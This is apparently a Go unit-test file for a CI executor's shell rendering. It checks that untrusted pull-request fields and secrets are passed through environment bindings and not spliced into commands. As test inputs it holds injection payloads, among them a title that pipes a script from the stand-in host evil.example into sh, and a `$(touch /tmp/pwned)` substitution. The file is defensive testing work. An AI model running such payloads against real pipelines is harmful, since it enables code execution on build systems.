// SPDX-License-Identifier: AGPL-3.0-or-later

package exec

import (
	"reflect"
	"testing"

	"github.com/tenseleyFlow/shithub/internal/actions/expr"
)

func TestRenderShell_TaintedExpressionUsesEnvBinding(t *testing.T) {
	t.Parallel()
	ctx := expr.Context{
		Shithub: expr.ShithubContext{
			Event: map[string]any{
				"pull_request": map[string]any{
					"title": `"; curl evil.example | sh #`,
				},
			},
		},
		Untrusted: expr.DefaultUntrusted(),
	}
	bindings := NewBindings("")
	got, err := RenderShell(`echo "${{ shithub.event.pull_request.title }}"`, &ctx, bindings)
	if err != nil {
		t.Fatalf("RenderShell: %v", err)
	}
	if got != `echo "${SHITHUB_INPUT_0}"` {
		t.Fatalf("command:\ngot  %q\nwant %q", got, `echo "${SHITHUB_INPUT_0}"`)
	}
	if bindings.Env()["SHITHUB_INPUT_0"] != `"; curl evil.example | sh #` {
		t.Fatalf("bindings: %#v", bindings.Env())
	}
}

func TestRenderShell_SensitiveSecretUsesEnvBinding(t *testing.T) {
	t.Parallel()
	ctx := expr.Context{
		Secrets: map[string]string{
			"TOKEN": "hunter2",
		},
		Untrusted: expr.DefaultUntrusted(),
	}
	bindings := NewBindings("")
	got, err := RenderShell(`echo "${{ secrets.TOKEN }}"`, &ctx, bindings)
	if err != nil {
		t.Fatalf("RenderShell: %v", err)
	}
	if got != `echo "${SHITHUB_INPUT_0}"` {
		t.Fatalf("command:\ngot  %q\nwant %q", got, `echo "${SHITHUB_INPUT_0}"`)
	}
	if bindings.Env()["SHITHUB_INPUT_0"] != "hunter2" {
		t.Fatalf("bindings: %#v", bindings.Env())
	}
}

func TestRenderStep_EnvTaintPropagatesToRunExpressions(t *testing.T) {
	t.Parallel()
	ctx := expr.Context{
		Shithub: expr.ShithubContext{
			Event: map[string]any{"title": `$(touch /tmp/pwned)`},
		},
		Untrusted: expr.DefaultUntrusted(),
	}
	got, err := RenderStep(StepInput{
		Context: ctx,
		JobEnv: map[string]string{
			"TITLE": "${{ shithub.event.title }}",
		},
		Run: "echo ${{ env.TITLE }}",
	})
	if err != nil {
		t.Fatalf("RenderStep: %v", err)
	}
	if got.Env["TITLE"] != `$(touch /tmp/pwned)` || !got.EnvTaint["TITLE"] {
		t.Fatalf("env/taint: env=%#v taint=%#v", got.Env, got.EnvTaint)
	}
	if got.Run != "echo ${SHITHUB_INPUT_0}" {
		t.Fatalf("run: %q", got.Run)
	}
	if got.Env["SHITHUB_INPUT_0"] != `$(touch /tmp/pwned)` {
		t.Fatalf("input binding: %#v", got.Env)
	}
}

func TestRenderStep_EnvSensitivityPropagatesToRunExpressions(t *testing.T) {
	t.Parallel()
	ctx := expr.Context{
		Secrets:   map[string]string{"PRIVATE": "from-context"},
		Untrusted: expr.DefaultUntrusted(),
	}
	got, err := RenderStep(StepInput{
		Context: ctx,
		JobEnv: map[string]string{
			"PRIVATE": "${{ secrets.PRIVATE }}",
		},
		Run: "echo ${{ env.PRIVATE }}",
	})
	if err != nil {
		t.Fatalf("RenderStep: %v", err)
	}
	if got.Env["PRIVATE"] != "from-context" || !got.EnvSensitive["PRIVATE"] {
		t.Fatalf("env/sensitive: env=%#v sensitive=%#v", got.Env, got.EnvSensitive)
	}
	if got.Run != "echo ${SHITHUB_INPUT_0}" {
		t.Fatalf("run: %q", got.Run)
	}
	if got.Env["SHITHUB_INPUT_0"] != "from-context" {
		t.Fatalf("input binding: %#v", got.Env)
	}
}

func TestRenderStep_ResolvesTrustedExpressionsInline(t *testing.T) {
	t.Parallel()
	got, err := RenderStep(StepInput{
		Context: expr.Context{
			Vars:      map[string]string{"TARGET": "world"},
			Untrusted: expr.DefaultUntrusted(),
		},
		StepEnv: map[string]string{"GREETING": "hello ${{ vars.TARGET }}"},
		Run:     "echo ${{ env.GREETING }}",
	})
	if err != nil {
		t.Fatalf("RenderStep: %v", err)
	}
	if got.Run != "echo hello world" {
		t.Fatalf("run: %q", got.Run)
	}
	wantEnv := map[string]string{"GREETING": "hello world"}
	if !reflect.DeepEqual(got.Env, wantEnv) {
		t.Fatalf("env:\ngot  %#v\nwant %#v", got.Env, wantEnv)
	}
}

func TestRenderStep_StepEnvOverrideClearsJobEnvTaint(t *testing.T) {
	t.Parallel()
	ctx := expr.Context{
		Shithub:   expr.ShithubContext{Event: map[string]any{"title": "bad"}},
		Untrusted: expr.DefaultUntrusted(),
	}
	got, err := RenderStep(StepInput{
		Context: ctx,
		JobEnv: map[string]string{
			"TITLE": "${{ shithub.event.title }}",
		},
		StepEnv: map[string]string{
			"TITLE": "trusted",
		},
		Run: "echo ${{ env.TITLE }}",
	})
	if err != nil {
		t.Fatalf("RenderStep: %v", err)
	}
	if got.EnvTaint["TITLE"] {
		t.Fatalf("step override should clear taint: %#v", got.EnvTaint)
	}
	if got.Run != "echo trusted" {
		t.Fatalf("run: %q", got.Run)
	}
}

func TestRenderStep_StepEnvOverrideClearsJobEnvSensitivity(t *testing.T) {
	t.Parallel()
	ctx := expr.Context{
		Secrets:   map[string]string{"PRIVATE": "from-context"},
		Untrusted: expr.DefaultUntrusted(),
	}
	got, err := RenderStep(StepInput{
		Context: ctx,
		JobEnv: map[string]string{
			"PRIVATE": "${{ secrets.PRIVATE }}",
		},
		StepEnv: map[string]string{
			"PRIVATE": "trusted",
		},
		Run: "echo ${{ env.PRIVATE }}",
	})
	if err != nil {
		t.Fatalf("RenderStep: %v", err)
	}
	if got.EnvSensitive["PRIVATE"] {
		t.Fatalf("step override should clear sensitivity: %#v", got.EnvSensitive)
	}
	if got.Run != "echo trusted" {
		t.Fatalf("run: %q", got.Run)
	}
}

func TestRenderStep_RejectsReservedInputEnv(t *testing.T) {
	t.Parallel()
	_, err := RenderStep(StepInput{
		JobEnv: map[string]string{"SHITHUB_INPUT_0": "collision"},
		Run:    "true",
	})
	if err == nil {
		t.Fatal("RenderStep returned nil error")
	}
}
